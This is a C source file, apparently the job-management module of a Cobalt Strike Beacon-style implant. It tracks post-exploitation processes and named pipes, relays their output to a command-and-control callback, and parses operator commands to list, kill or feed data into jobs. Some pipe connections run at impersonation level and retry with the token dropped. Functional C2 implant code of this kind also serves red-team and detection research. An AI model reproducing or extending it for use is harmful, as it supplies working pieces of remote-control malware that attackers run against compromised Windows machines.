#include <winsock2.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#include "beacon.h"
#include "tokens.h"
#include "parse.h"
#include "commands.h"
#include "jobs.h"
#include "bformat.h"

/* keep track of our running jobs */
static psh_entry * psh_list = NULL;  /* TODO: cleaned up via psh_prune_list, however on exit may not cleanup pending jobs */
static DWORD       jids     = 0;

void cleanupProcess(PROCESS_INFORMATION  * pi) {
	if (pi->hProcess != INVALID_HANDLE_VALUE && pi->hProcess != 0)
		CloseHandle(pi->hProcess);

	if (pi->hThread != INVALID_HANDLE_VALUE && pi->hThread != 0)
		CloseHandle(pi->hThread);
}


/* add a job to our linked list */
void job_add(psh_entry * entry) {
	psh_entry * temp = psh_list;
	psh_entry * prev = NULL;

	/* assign the job number */
	entry->jid = jids;

	/* increment our job numbers */
	jids++;

	/* add our entry to the end of the list, to preserve output order */
	if (psh_list == NULL) {
		psh_list = entry;
	}
	else {
		while (temp != NULL) {
			prev = temp;
			temp = (psh_entry*)temp->next;
		}

		prev->next = entry;
	}
}

/* track a running powershell process */
void psh_track(PROCESS_INFORMATION pi, HANDLE read_stdout, HANDLE write_stdout) {
	psh_entry * entry = process_track(pi, read_stdout, write_stdout, "process");
	entry->type = CALLBACK_OUTPUT_OEM; /* cmd.exe/powershell.exe use OEM encoding, not ANSI */
}

/* track an arbitrary running process */
psh_entry * process_track(PROCESS_INFORMATION pi, HANDLE read_stdout, HANDLE write_stdout, char * desc) {
	psh_entry * entry = (psh_entry *)malloc(sizeof(psh_entry));

	entry->pi = pi;
	entry->read_stdout = read_stdout;
	entry->write_stdout = write_stdout;
	entry->next = NULL;
	entry->tag = JOB_ENTRY_PROCESS;
	entry->status = JOB_STATUS_GOOD;
	entry->pid = pi.dwProcessId;
	entry->type = CALLBACK_OUTPUT;
	entry->mode = JOB_MODE_BYTE;
	_snprintf(entry->description, JOB_DESCRIPTION_LENGTH, "%s", desc);

	job_add(entry);

	return entry;
}

/* track a named pipe */
void pipe_track(HANDLE read_stdout, DWORD pid, DWORD type, char * description, short mode) {
	psh_entry * entry = (psh_entry *)malloc(sizeof(psh_entry));

	entry->read_stdout  = read_stdout;
	entry->write_stdout = INVALID_HANDLE_VALUE;
	entry->next         = NULL;
	entry->tag          = JOB_ENTRY_NAMEDPIPE;
	entry->status       = JOB_STATUS_GOOD;
	entry->pid          = pid;
	entry->type         = type;
	entry->mode         = mode;
	strncpy(entry->description, description, JOB_DESCRIPTION_LENGTH);

	job_add(entry);
}

void psh_prune_list() {
	psh_entry * temp = psh_list;
	psh_entry * prev = NULL;

	/* process our dead entries */
	temp = psh_list;
	while (temp != NULL) {
		if (temp->status == JOB_STATUS_DEAD) {
			/* kill our process */
			if (temp->tag == JOB_ENTRY_PROCESS) {
				CloseHandle(temp->pi.hProcess);
				CloseHandle(temp->pi.hThread);
				CloseHandle(temp->read_stdout);
				CloseHandle(temp->write_stdout);
			}
			/* shutdown our named pipe instead */
			else if (temp->tag == JOB_ENTRY_NAMEDPIPE) {
				DisconnectNamedPipe(temp->read_stdout);
				CloseHandle(temp->read_stdout);
			}
		}
		temp = (psh_entry*)temp->next;
	}

	/* prune our list now */
	temp = psh_list;
	prev = NULL;

	while (temp != NULL) {
		if (temp->status == JOB_STATUS_DEAD) {
			if (prev == NULL) {
				psh_list = (psh_entry*)temp->next;
				free(temp);
				temp = psh_list;
			}
			else if (prev != NULL) {
				prev->next = temp->next;
				free(temp);
				temp = (psh_entry*)prev->next;
			}
		}
		else {
			prev = temp;
			temp = (psh_entry*)temp->next;
		}
	}
}

/* poll any running powershell processes for output and report it */
void psh_poll(void(*callback)(char * buffer, int length, int type), int max) {
	psh_entry * temp = psh_list;
	psh_entry * prev = NULL;
	int total_read = 0;
	char * bufferz = NULL;

	if (temp == NULL)
		return;

	/* allocate our output buffer */
	bufferz = (char *)malloc(sizeof(char) * max);

	/* let's loop through our entries and extract output */
	while (temp != NULL) {
		/* handle the read */
		if (temp->mode == JOB_MODE_MESSAGE) {
			/* [len][blob] framing, plus the official Postex Kit 4.10 chunk
			 * framing (see read_postex_message) for execute-dll parity */
			int type_override = -1;
			total_read = read_postex_message(temp->read_stdout, bufferz, max, &type_override);
			if (type_override >= 0) {
				temp->type = (DWORD)type_override;
			}
		}
		else {
			/* we assume we're able to get what we need by reading what's available. Good for text output */
			total_read = read_all_from_pipe(temp->read_stdout, bufferz, max);
		}

		if (total_read > 0) {
			callback(bufferz, total_read, temp->type);
		}

		/* check if the pipe is alive or not */
		if (temp->tag == JOB_ENTRY_NAMEDPIPE && total_read == -1) {
			temp->status = JOB_STATUS_DEAD;
		}
		/* if it's a process, check if the process is dead or not */
		else if (temp->tag == JOB_ENTRY_PROCESS && WaitForSingleObject(temp->pi.hProcess, 0) != WAIT_TIMEOUT) {
			temp->status = JOB_STATUS_DEAD;
		}

		if (temp->mode == JOB_MODE_MESSAGE && total_read > 0) {
			/* keep trying to grab messages from our pipe in case a bunch of stuff is queued up */

			// Raphael Note: this scared the living "everything" out of me doing it. My fear? What happens if we're reading "too much"
			// and suddenly our C2 gets clogged. Cobalt Strike is resilient to this. Each of the channels know when they have
			// exceeded the limit of the amount of data to send back in one message and have strategies to deal with it.
			//
			// Some channels (DNS, HTTP CHUNKED C2) send output messages back as individual C2 messages.
			//
			// Other channels (HTTP/S with POST) know when they've exceeded what they'll send in one message and clear their queue by
			// sending what they have. 
			//
			// The pivot C2 channels deal with this as well; but differently. They go into a mode where they flush what they have, add
			// the new message to their freshly cleared output. They then [from the write function] block to read the next tasks, process 
			// them, but don't poll for new output. This happens in a single thread and the effect is that the original polling for output 
			// keeps getting processed until it's completed. At that point, the main loop (which includes polling for output again) has 
			// control again. Flushing only happens if we have too much output (where we go into this mode) or after each main loop iteration.
		}
		else {
			temp = (psh_entry*)temp->next;
		}
	}

	/* clear our output gleaned from these pipes from memory  */
	memset(bufferz, 0, sizeof(char) * max);
	free(bufferz);

	/* process dead entries */
	psh_prune_list();
}

/* 4.10 execute-dll parity: tolerate the official Postex Kit chunk framing
 * on top of the classic [int32 LE len][blob] message framing.
 *
 * classic (sleeve DLLs, our lineage): [int32 LE len][len bytes blob]
 * postex kit 2024 (official 4.10+):   [int32 BE len][int32 BE flags|chunkId]
 *                                      [int32 BE callbackType][payload]
 * where BE len = sizeof(DWORD) + payload length.
 *
 * Detection: read the first 4 bytes; a sane native (LE) reading means the
 * classic framing; a sane byteswapped reading means a kit chunk. On a kit
 * chunk the payload is copied out and the embedded callback type comes
 * back through type_override. Returns bytes copied, 0 = nothing pending,
 * -1 = pipe gone. */
int read_postex_message(HANDLE handle, char * buffer, int maxlength, int * type_override) {
	DWORD avail;
	int  get = 0;
	int  rlen;
	int  swap;

	*type_override = -1;

	if (!PeekNamedPipe(handle, NULL, 0, NULL, &avail, 0)) {
		return -1;
	}
	if (avail <= 0) {
		return 0;
	}

	/* read the length field */
	rlen = read_all(handle, (char *)&get, 4);
	if (rlen == -1 || rlen != 4) {
		return -1;
	}

	/* classic framing sanity: [len][blob] with len <= maxlength */
	if (get > 0 && get <= maxlength) {
		return read_all(handle, buffer, get);
	}

	/* kit chunk: [int32 BE len][int32 BE flags][int32 BE type][payload]
	 * where len = 4 + payload, so after the length prefix the message
	 * still holds flags(4) + type(4) + payload = len + 4 bytes */
	swap = ((get & 0xff) << 24) | ((get & 0xff00) << 8) | ((get >> 8) & 0xff00) | ((get >> 24) & 0xff);
	if (swap > 8 && swap + 4 <= maxlength) {
		char * chunk;
		int    ctype;
		int    payload;

		chunk = (char *)malloc(swap + 4);
		if (chunk == NULL) {
			return -1;
		}

		/* read flags + type + payload in one go */
		if (read_all(handle, chunk, swap + 4) == -1) {
			free(chunk);
			return -1;
		}

		memcpy(&ctype, chunk + 4, 4);
		ctype = ((ctype & 0xff) << 24) | ((ctype & 0xff00) << 8) | ((ctype >> 8) & 0xff00) | ((ctype >> 24) & 0xff);

		payload = swap - 4;
		if (payload > maxlength) {
			payload = maxlength;
		}
		memcpy(buffer, chunk + 8, payload);
		*type_override = ctype;
		free(chunk);
		return payload;
	}

	/* neither framing makes sense */
	return -1;
}

int read_blob_from_pipe(HANDLE handle, char * buffer, int maxlength) {
	DWORD avail;
	int get = 0, rlen = 0;

	/* -1 means the pipe closed */
	if (!PeekNamedPipe(handle, NULL, 0, NULL, &avail, 0)) {
		return -1;
	}

	/* 0 means we're alive, but no data. Fine point :) */
	if (avail <= 0) {
		return 0;
	}

	/* read our length plz */
	rlen = read_all(handle, (char *)&get, 4);
	if (rlen == -1 || rlen != 4)
		return -1;

	/* sanity check our get value */
	if (get > maxlength)
		return -1;

	/* read the value */
	return read_all(handle, buffer, get);
}

int read_all_from_pipe(HANDLE handle, char * buffer, int maxlength) {
	unsigned long bread = 0;
	unsigned long avail;
	unsigned long total_read = 0;

	// dlog("jobs.read_all_from_pipe starting - Max Length: %d \n", maxlength);

	if (!PeekNamedPipe(handle, NULL, 0, NULL, &avail, 0)) {
		return -1;
	}

	while (avail > 0 && total_read < maxlength) {
		ReadFile(handle, buffer, maxlength - total_read, &bread, NULL);
		total_read += bread;
		buffer += bread;

		if (!PeekNamedPipe(handle, NULL, 0, NULL, &avail, 0)) {
			return -1;
		}
	}

	// dlog("jobs.read_all_from_pipe returning - Total Bytes Read: %d Last Bytes Read: %d \n", total_read, bread);
	return total_read;
}

/* connect to a local named pipe */
BOOL _connect_pipe_level(char * pipename, HANDLE * pipe, DWORD level) {
	DWORD  status;
	DWORD  mode;

	while (TRUE) {
		/* connect to our pipe */
		*pipe = CreateFile(pipename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | level, NULL);

		/* are we good to go?!? rock! */
		if (*pipe != INVALID_HANDLE_VALUE) {
			break;
		}

		/* punt... not going to work */
		if (GetLastError() != ERROR_PIPE_BUSY) {
			return FALSE;
		}

		/* let's see if it'll ever become available for our devious purposes */
		if (!WaitNamedPipe(pipename, 10000)) {
			SetLastError(WAIT_TIMEOUT);
			return FALSE;
		}
	}

	/* congrats.. we're connected. Now, we need to read an agent id */
	mode = PIPE_READMODE_BYTE;
	status = SetNamedPipeHandleState(*pipe, &mode, NULL, NULL);

	if (!status) {
		DisconnectNamedPipe(*pipe);
		CloseHandle(*pipe);

		return FALSE;
	}
	else {
		return TRUE;
	}
}

/* connect to pipe, but handle dropping / not dropping the token with some grace. Thanks! */
BOOL connect_pipe_level(char * pipename, HANDLE * pipe, DWORD level) {
	/* drop our current token when we connect to the pipe anonymously. This helps mitigate situations where our
	   current token does not have enough privileges to connect to this pipe and make use of the capability */
	if (level == SECURITY_ANONYMOUS) {
		BOOL result;
		result = _connect_pipe_level(pipename, pipe, level);

		/* error 5 is access denied, drop the token and try again */
		if (result == FALSE && GetLastError() == 5) {
			token_guard_start();
			result = _connect_pipe_level(pipename, pipe, level);
			token_guard_stop();
		}

		return result;
	}
	/* OK, treat this as normal. We want the current token and it's up to the capability to weaken its permissions
	   so our current token can connect to it */
	else {
		return _connect_pipe_level(pipename, pipe, level);
	}
}

/* default should always be SECURITY_ANONYMOUS to avoid giving malicious apps a privilege escalation */
BOOL connect_pipe(char * pipename, HANDLE * pipe) {
	return connect_pipe_level(pipename, pipe, SECURITY_ANONYMOUS);
}

/* wait for up to [wait] ms for data to appear in this pipe. This is my way to make some post-ex
   jobs block until they're complete (e.g., screenshot). */
void pipe_try(HANDLE handle, DWORD wait) {
	DWORD avail  = 0;
	DWORD stopat = GetTickCount() + wait;

	while (GetTickCount() < stopat) {
		/* some sort of failure occurred... boo! */
		if (!PeekNamedPipe(handle, NULL, 0, NULL, &avail, 0)) {
			return;
		}
		/* we have data, go ahead and return */
		else if (avail > 0) {
			return;
		}
		/* wait half a second until we try again */
		else {
			Sleep(500);
		}
	}
}

void command_job_register(char * buffer, int length, BOOL impersonate, short mode) {
	HANDLE phandle;
	datap parser;
	char pipename[64] = { 0 };
	char description[64] = { 0 };
	int  x = 0;
	DWORD pid;
	DWORD type;
	DWORD wait;
	DWORD level;

	/* setup our data parser */
	data_init(&parser, buffer, length);

	/* extract PID */
	pid = data_int(&parser);

	/* extract callback type */
	type = data_short(&parser);

	/* extract time to wait for available data */
	wait = data_short(&parser);

	/* extract pipe name */
	if (!data_string(&parser, pipename, 64)) {
		return;
	}

	/* extract description */
	if (!data_string(&parser, description, JOB_DESCRIPTION_LENGTH)) {
		return;
	}

	/* handle our impersonation flag */
	if (impersonate) {
		level = SECURITY_IMPERSONATION;
	}
	else {
		level = SECURITY_ANONYMOUS;
	}

	/* try up to 20x (500ms = 10s block) to connect to pipe */
	for (x = 0; x < 20; x++) {
		if (connect_pipe_level(pipename, &phandle, level)) {
			if (wait > 0) {
				pipe_try(phandle, wait);
			}

			pipe_track(phandle, pid, type, description, mode);
			return;
		}
		else {
			Sleep(500);
		}
	}

	post_error_d(0x14, GetLastError());
}

void command_jobs(void(*callback)(char * buffer, int length, int type)) {
	psh_entry     * temp   = psh_list;
	formatp         format;

	/* init our buffer */
	bformat_init(&format, 32768);

	/* walk our list */
	while (temp != NULL) {
		/* add a result to our buffer */
		bformat_printf(&format, "%d\t%d\t%s\n", temp->jid, temp->pid, temp->description);

		/* move on to the next list entry */
		temp = (psh_entry*)temp->next;
	}

	/* fire our callback */
	callback(bformat_string(&format), bformat_length(&format), CALLBACK_JOBS);

	/* clean up the buffer */
	bformat_free(&format);
}

void command_job_kill(char * buffer, int length) {
	psh_entry     * temp = psh_list;
	datap           parser;
	int             jid;

	/* setup our data parser */
	data_init(&parser, buffer, length);

	/* extract JID */
	jid = data_short(&parser);

	/* walk our list */
	while (temp != NULL) {
		/* add a result to our buffer */
		if (temp->jid == jid) {
			temp->status = JOB_STATUS_DEAD;
		}

		/* move on to the next list entry */
		temp = (psh_entry*)temp->next;
	}

	/* prune our list please */
	psh_prune_list();
}

/* 4.10 bjob_send_data parity: write a blob into a running job's pipe.
 *
 * wire: [short jid][blob]
 *
 * The postex DLL on the other end picks the data up through the kit's
 * BeaconInputAvailable()/BeaconInputRead() (or our test DLL's equivalent). */
void command_job_data(char * buffer, int length) {
	datap       parser;
	psh_entry * temp = psh_list;
	int         jid;
	char *      data;
	int         dlen;
	DWORD       written = 0;

	data_init(&parser, buffer, length);

	jid  = data_short(&parser);
	data = data_buffer(&parser);
	dlen = data_length(&parser);

	if (dlen <= 0) {
		return;
	}

	while (temp != NULL) {
		if (temp->jid == (DWORD)jid && temp->status != JOB_STATUS_DEAD) {
			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {
				post_error_d(0x55, GetLastError());
			}
			return;
		}
		temp = (psh_entry*)temp->next;
	}

	post_error_d(0x56, (DWORD)jid);
}
